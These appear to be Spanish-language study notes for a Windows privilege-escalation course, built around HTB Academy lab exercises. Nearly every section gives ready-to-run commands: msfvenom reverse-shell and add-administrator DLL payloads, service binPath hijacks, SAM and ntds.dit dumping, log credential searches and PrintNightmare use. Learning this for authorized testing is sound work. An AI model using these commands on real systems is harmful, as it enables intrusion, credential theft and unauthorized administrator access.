## Enumeración automática
### `Winpeas`
- Para escalada de privilegios en general
	```powershell
	winPEASx64.exe
	```

### `Snaffler`
- Ideal para buscar información sensible en el sistema, especialmente si tenemos acceso a recursos compartidos. 
	```powershell
	Snaffler.exe -snaffle -o snaffler_output.txt
	```

| Comando                                                                             | Descripción                                                               |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| `Snaffler.exe -s`                                                                   | Escaneo básico de todo lo accesible (local y red).                        |
| `Snaffler.exe -i C:\ -s`                                                            | Escanea solo el disco local `C:\`.                                        |
| `Snaffler.exe -i "\\10.10.10.10\share" -s`                                          | Escanea una ruta de red específica.                                       |
| `Snaffler.exe -i C:\,\\10.10.10.10\share -s`                                        | Escanea múltiples rutas locales y de red.                                 |
| `Snaffler.exe -s --threads 20`                                                      | Ejecuta el escaneo usando 20 hilos (más rápido).                          |
| `Snaffler.exe -s -o results.txt`                                                    | Guarda los resultados en `results.txt`.                                   |
| `Snaffler.exe -s --excludePaths Windows,ProgramData`                                | Excluye rutas comunes que generan mucho ruido.                            |
| `Snaffler.exe -i C:\ -s --excludePaths Windows,ProgramData --threads 15 -o out.txt` | Escaneo optimizado, excluyendo rutas, con multihilo y guardado a archivo. |
### Seatbelt
- Listar información sensible, más sigiloso que `snaffler` 
	```powershell
	Seatbelt.exe all > sealtbelt_output.txt
	```
### PowerUp
Detecta configuraciones de Windows mal hechas o peligrosas que permiten escalar privilegios a SYSTEM o Administrador.
- Comando más útil (tras cargar el módulo de `PowerUp`)
	```powershell
	Invoke-AllChecks -Verbose
	```

## Enumeración manual
### Enumeración de red
```powershell
# interfaces
ipconfig /all
#Tabla arp
arp -a
# Tablas de enrutamiento
route print
```
### Enumerando protecciones
```powershell
# Windows defender status
Get-MpComputerStatus
# AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Test AppLockerPolice
 Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
### Enumeración inicial
#### Procesos, programas, entorno
- Mostrar procesos corriendo en el sistema
	```powershell
	tasklist /svc
	```
- Mostrar variables de entorno
	```powershell
	set
	```
- Información detallada de la configuración del sistema
	```bash
	systeminfo
	```
- Parches y actualizaciones
	```powershell
	 # cmd
	wmic qfe
	# powershell
	Get-HotFix | ft -AutoSize
	```
- Programas instalados
	```bash
	#Bash
	wmic product get name
	# powershell
	Get-WmiObject -Class Win32_Product |  select Name, Version
	```
- Procesos en red
	```powershell
	netstat -ano
	# Proceso asociado a un servicio (en el comando anterior veríamos el PID)
	tasklist.exe /FI "PID eq 1872"
	# Powershell
	get-process -Id 1872
	```
#### Usuarios y grupos
- Usuarios logueados
	```powershell
	query user
	```
- Usuario actual
	```powershell
	echo %USERNAME%
	```
- Privilegios actuales del usuario
	```powershell
	whoami /priv
	```
- Pertenencia a grupos
	```powershell
	whoami /groups
	```
- Mostrar todos los usuarios
	```powershell
	net user
	```
- Mostrar todos los grupos
	```powershell
	net localgroup
	```
- Detalles de un grupo en concreto
	```powershell
	net localgroup administrators
	```
- Política de contraseñas y alguna información adicional
	```powershell
	net accounts
	```
#### Named pipes
[TODO](https://academy.hackthebox.com/module/67/section/926)

## Privilegios de usuarios
- Comprobar privilegios 
	```powershell
	whoami /priv
	```
### SeImpersonate Privilege 
- Nos permite escalar privilegios con Printspoofer, sigma potato
	```powershell
	# sigmapotato
	.\sigmapotato.exe "net user an0nio 1234 /add"	
	.\sigmapotato.exe "net localgroup Administrators an0nio /add "
	# printspoofer
	.\PrintSpoofer.exe -i -c "powershell"
	```

### SeDebugPrivilege
- Por una parte podemos activar mimikatz con `privilege::debug`, lo cual nos permite volcar LSASS, SAM (podríamos intentar volcar de forma [[Credenciales en Windows#Obtener lsass.dmp| menos automática]] si no funciona, ya que tenemos permisos)
- RCE como system con `psgetsys.ps1`
	```powershell
	# Funcionamiento
	. .\psgetsys.ps1
	ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
	# Ejemplo con procesos lsass o winlogon, que se ejecutan como system
	. .\psgetsys.ps1
	 ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command "cmd.exe"  -cmdargs ""
	 ImpersonateFromParentPid -ppid (Get-Process "winlogon").Id -command "cmd.exe"  -cmdargs ""
	```

### SeChangeNotifyPrivilege 
- Permite activar otros privilegios adicionales como `SeTakeOwnershipPrivilege`, `SeDebugPrivilege` ó `SeIncreaseWorkingSetPrivilege`  si estaban como `Disabled`. Usamos el script que aparece [aquí](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
	```powershell
	.\EnableAllTokenPrivs.ps1
	```
### SeTakeOwnershipPrivilege
- Si tenemos este permiso, podemos tomar la propiedad de cualquier objeto securizable (archivos, carpetas, servicios, procesos, objetos de AD...)
	```powershell
	# Tomamos la propiedad del archivo
	takeown /f "C:\TakeOwn\flag.txt"
	# Agregar permisos completos al usuario (en este caso htb-student)
	icacls "C:\TakeOwn\flag.txt" /grant htb-student:F
	```

## Grupos integrados de Windows
### Pertenencia a alguno de los grupos
- Podemos comprobar si nuestro usuario está en alguno de los grupos que se muestran a continuación
	```powershell
	whoami /groups | findstr /i "Backup Operators Event Log Readers DnsAdmins Print Operators Server Operators"
	# o una búsqueda más afinada
	$targetGroups = @(
    "BUILTIN\Backup Operators",
    "BUILTIN\Event Log Readers",
    "BUILTIN\DnsAdmins",
    "BUILTIN\Print Operators",
    "BUILTIN\Server Operators"
	)

	$groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
	    ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }
	
	foreach ($group in $groups) { if ($targetGroups -contains $group.Value) { Write-Output "Perteneces a: $($group.Value)" }}
	```
### Backup Operators
El grupo `Backup Operators` es **local**, no de dominio y `SeBackupPrivilege` no se "hereda" o propaga entre máquinas del dominio. Aún así, este grupo permite **leer cualquier archivo local del sistema** aunque no tenga permisos explícitos, aunque no de forma standard con el comando `cp` . Por defecto, este grupo está vacío. 
- Pertenencia al grupo
	```powershell
	# Comprobar si pertenecemos al grupo
	whoami /groups | findstr /i "backup"
	# Mostrar miembros del grupo
	net localgroup "Backup Operators"
	```
- La siguiente [Poc](https://github.com/giuliano108/SeBackupPrivilege) permite explotar este privilegio. Primero debemos importar las librerías en `PS` (debemos tener permisos de escritura en la carpeta en la que los descarguemos)
	```powershell
	Import-Module .\SeBackupPrivilegeUtils.dll
	Import-Module .\SeBackupPrivilegeCmdLets.dll
	```
- Comprobamos si tenemos el privilegio `SeBackupPrivilege` activado y lo activamos si es necesario
	```powershell
	whoami /priv
	# Si no está activado, lo activamos con 
	```
- Si no está activado y tenemos
	```powershell
	Set-SeBackupPrivilege
	# Comprobamos que está activado a continuación
	Get-SeBackupPrivilege
	```
- Una vez está activado, ya podemos copiar cualquier archivo protegido
	```powershell
	Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt ..\svc_backup\flag.txt
	# Si estuviéramos en un DC...
	Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
	# También podríamos volcar la SAM 
	reg.exe save hklm\sam C:\Users\public\sam.save
	reg.exe save hklm\system C:\Users\public\system.save
	```
### Event log readers
Nos permite acceder a los logs del sistema
- Pertenencia al grupo
	```powershell
	# Comprobar si pertenecemos al grupo
	whoami /groups | findstr /i "log"
	# Mostrar miembros del grupo
	net localgroup "Event Log Readers"
	```
- Búsqueda con `webtutil` (nativa de Windows)

| 🎯 Objetivo                       | 💣 Comando `wevtutil`                                                                                 |
| --------------------------------- | ----------------------------------------------------------------------------------------------------- |
| 🔐 Contraseñas en argumentos      | `wevtutil qe Security /rd:true /f:text \| findstr /i "password pass pwd /user /p:"`                   |
| 💳 Credenciales vía net use       | `wevtutil qe Security /rd:true /f:text \| findstr /i "net use"`                                       |
| ✏️ Scripts con secretos (.ps1...) | `wevtutil qe Security /rd:true /f:text \| findstr /i ".ps1 .bat token key secret .vbs"`               |
| 🧠 Tokens o valores sospechosos   | `wevtutil qe Security /q:"*[System[(EventID=4688)]]" /rd:true /f:text \| findstr /i "password token"` |
| 🧍 Usuario + contraseña juntos    | `wevtutil qe Security /rd:true /f:text \| findstr /i "/user: /pass: /u: /p:"`                         |
| 📂 Rutas sensibles accedidas      | `wevtutil qe Security /rd:true /f:text \| findstr /i "cred hash secrets.txt ntds.dit"`                |
| 📦 Archivos clave como argumentos | `wevtutil qe Security /rd:true /f:text \| findstr /i ".kdbx id_rsa .ovpn .env"`                       |
### DNS Admins
Los usuarios pertenecientes  a este grupo tienen control total sobre el servicio DNS del DC. 
- Los usuarios de este grupo pueden utiliar  `dnscmd.exe` para cargar un dll personalizada como plugin de dns. Como el servicio DNS se ejecuta como `NT AUTHORITY\SYSTEM`, también lo hará nuestra dll. 
- Comprobar que pertenecemos al grupo
	```powershell
	net localgroup "DnsAdmins"
	```
- Creación de dll (podría ser revshell en lugar de esta)
	```powershell
	 msfvenom -p windows/x64/exec CMD='net user an0nio Password123! /add && net localgroup Administrators an0nio /add' -f dll -o adduser.dll
	```
- Cargamos la dll como plugin (debemos poner ruta absoluta)
	```cmd-session
	dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
	```
- Reiniciamos el servicio dns
	```powershell
	sc.exe stop dns
	sc.exe start dns
	```
### Print operators
TODO [htb](https://academy.hackthebox.com/module/67/section/605)
### Server operators
Permite a los usuarios de este grupo administrar Windows Servers sin necesidad de tener privilegios de Domain Admin. Los miembros de este grupo tienen los privilegios `SeBackupPrivilege` y `SeRestorePrivilege`. Ponemos un ejemplo de como escalar privilegios
- Comprobamos la pertenencia al grupo
	```powershell
	net localgroup "Server Operators"
	```

- Identificamos un servicio que corra como system
	```powershell
	# en el ejemplo ponen este
	sc.exe qc AppReadiness
	# pero podemos buscar servicios
	Get-WmiObject win32_service | Where-Object { $_.StartName -eq "LocalSystem" } | Select-Object Name, DisplayName, StartName
	# y después revisar individualmente
	sc.exe qc <nombre_servicio>
	# Salida esperada: 
	SERVICE_START_NAME : LocalSystem
	```
- Modificamos la ruta del binario del servicio
	```powershell
	sc.exe config AppReadiness binPath= "cmd /c net user an0nio Password123! /add & net localgroup Administrators an0nio /add"
	```
- Iniciamos el servicio (fallará, pero ejecuta el comando)
	```powershell
	sc.exe start AppReadiness
	```
## Atacando el sistema operativo
### UAC

TODO [htb](https://academy.hackthebox.com/module/67/section/626)
### Weak permissions - PowerUp
-  Al ejecutar
	```powershell
	Invoke-AllChecks
	```
	podemos revisar la parte de check, para ver que tipo de permiso débil podemos explotar
- Algunos falsos positivos se dan cuando en la salida nos muestra que el `Modifiable File` está en `C:\`
- Debemos tener en cuenta que siempre que consigamos realizar alguna de las aacciones, debemos poder iniciar/reiniciar el servicio de algún modo (o se debe iniciar/reiniciar periódicamente)
#### Reemplazando de binario de servicio - `Modifiable Service Files`
- En `Invoke-AllChecks` aparece `Check` como:
	```
	Check:         Modifiable Service Files
	```
- Podemos encontrarlos al correr el siguiente script de `PowerUp`
	```powershell
	Get-ModifiableServiceFile
	....
	ServiceName                     : SecurityService
	Path                            : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
	```
- Con la salida obtenida, comprobamos que tenemos permisos de escritura sobre el binario con `icacls` y creamos una revshell con `msfvenom`
	```bash
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=$vpnip LPORT=5555 -f exe -o revshell.exe
	```
- Tras crear el archivo lo llevamos a la ruta modificable
	```powershell
	cp C:\Users\Public\revshell.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
	```
- Y tras ponernos en escucha e iniciar el serivico (no nos deja `sc.exe stop securityservice`)
	```powershell
	sc.exe start securityservice
	```
#### Servicios con binpath modificable - `Modifiable Services`
- En `Invoke-AllChecks` aparece `Check` como:
	```
	Check:         Modifiable Services
	```
- Aparecerán al escribir
	```powershell
	Get-ModifiableService
	...
	ServiceName   : WindscribeService
	Path          : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
	```
- Podemos explotarlos del siguiente modo
	```powershell
	sc.exe config WindscribeService binpath="cmd /c net user an0nio Password123! /add & net localgroup Administrators an0nio /add"
	sc.exe stop WindscribeService
	sc.exe start WindscribeService
	```
#### Ruta sin comillas - `Unquoted Service Paths`
- En `Invoke-AllChecks` aparece `Check` como:
	```
	Check:         Unquoted Service Paths
	```
- Aparecerán al escribir
	```powershell
	Get-UnquotedService
	...
	ServiceName    : SystemExplorerHelpService
	Path           : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
	```
- Si tenemos permisos de escritura en `C:\` ó en `C:\Program Files (x86)`, podremos explotarlo creando un binario como sigue
	```powershell
	C:\Program.exe\
	C:\Program Files (x86)\System.exe
	```
- Después deberíamos reiniciar el servicio 
#### Registros mal configurados en registro -  `Modifiable Registry Autorun`
 - En `Invoke-AllChecks` aparece `Check` como:
	```powershell
	Check:         Modifiable Registry Autorun
	```
- Aparecerán al escribir
	```powershell
	Get-ModifiableRegistryAutoRun
	# mostramos solo la key, que es lo que se explota
	Get-ModifiableRegistryAutoRun | select key
	HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\SystemExplorerAutoStart
	```
- Lo explotamos del siguiente modo (`revshell.exe` con msfvenom): 
	```powershell
	Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemExplorerAutoStart' -Value 'C:\Users\Public\revshell.exe'
	```

### Kernel exploits 
TODO: Mucha más información en [htb](https://academy.hackthebox.com/module/67/section/627). Herramientas como Winpeas deberían avisarnos de vulnerabilidades. Mostramos como explotar PrintNightmare como ejemplo
#### PrintNightmare
- Utilizamos la [siguiente poc](https://github.com/calebstewart/CVE-2021-1675) de JohnHammond
	```powershell
	Import-Module .\cve-2021-1675.ps1
	Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
	
	Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
	```
- O si queremos realizar cualquier otra acción con un archivo dll
	```powershell
	Import-Module .\cve-2021-1675.ps1
	Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
	```
### Vulnerable services
- Enumeración de los programas instalados (la idea es buscar con `google` o `searchsploit` si los programas instalado son vulnerables)
	```powershell
	 wmic product get name
	```
- Puede ser interesante también  ver si la aplicación instalada está corriendo (supongamos que la aplicación es `Druva`)
	```powershell
	get-service | ? {$_.DisplayName -like 'Druva*'}
	```
### DLL inyection
TODO: Tiene pinta de ser muy interesante, pero falta tiempo . Apuntes [aquí](https://academy.hackthebox.com/module/67/section/2501)
## Herramientas 
[Algunos binarios precompilados](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

|Tool|Description|
|---|---|
|[Seatbelt](https://github.com/GhostPack/Seatbelt)|C# project for performing a wide variety of local privilege escalation checks|
|[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)|WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)|
|[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)|PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found|
|[SharpUp](https://github.com/GhostPack/SharpUp)|C# version of PowerUp|
|[JAWS](https://github.com/411Hall/JAWS)|PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0|
|[SessionGopher](https://github.com/Arvanaghi/SessionGopher)|SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information|
|[Watson](https://github.com/rasta-mouse/Watson)|Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.|
|[LaZagne](https://github.com/AlessandroZ/LaZagne)|Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more|
|[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)|WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported|
